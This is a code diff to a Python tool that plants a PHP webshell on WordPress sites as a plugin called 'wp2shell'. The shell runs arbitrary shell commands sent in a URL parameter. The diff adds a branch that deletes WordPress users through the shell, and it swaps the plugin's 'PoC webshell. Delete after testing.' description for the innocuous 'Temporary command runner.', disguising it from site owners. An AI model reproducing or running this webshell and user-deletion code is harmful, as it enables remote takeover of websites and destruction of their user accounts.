@@ -104,6 +104,18 @@ class AdminSession:
             return False
         return False
 
+    def delete_user_with_shell(self, shell_path: str, username: str, *, reassign_to: int) -> bool:
+        query = urllib.parse.urlencode(
+            {
+                "t": self._token,
+                "delete_user": username,
+                "reassign": str(reassign_to),
+            }
+        )
+        output = self._get(f"{shell_path}?{query}")
+        match = re.search(rf"{_MARKER}::(.*?)::END", output, re.S)
+        return bool(match and match.group(1).strip() == "deleted")
+
     # -- helpers ------------------------------------------------------------
 
     def _get(self, path: str) -> str:
@@ -121,10 +133,16 @@ class AdminSession:
         # The webshell only runs when the request carries the per-session token.
         php = (
             "<?php\n"
-            "/*\nPlugin Name: wp2shell\nDescription: PoC webshell. Delete after testing.\n*/\n"
-            "chdir(__DIR__);\n"
+            "/*\nPlugin Name: wp2shell\nDescription: Temporary command runner.\n*/\n"
             f"if (hash_equals('{self._token}', (string) ($_GET['t'] ?? '')) && isset($_GET['c'])) {{\n"
+            "    chdir(__DIR__);\n"
             f"    echo '{_MARKER}::' . shell_exec((string) $_GET['c']) . '::END';\n"
+            f"}} elseif (hash_equals('{self._token}', (string) ($_GET['t'] ?? '')) && isset($_GET['delete_user'])) {{\n"
+            "    require_once dirname(__DIR__, 3) . '/wp-load.php';\n"
+            "    require_once ABSPATH . 'wp-admin/includes/user.php';\n"
+            "    $user = get_user_by('login', (string) $_GET['delete_user']);\n"
+            "    $ok = $user ? wp_delete_user((int) $user->ID, (int) ($_GET['reassign'] ?? 0)) : false;\n"
+            f"    echo '{_MARKER}::' . ($ok ? 'deleted' : 'failed') . '::END';\n"
             "}\n"
         )
         buffer = io.BytesIO()
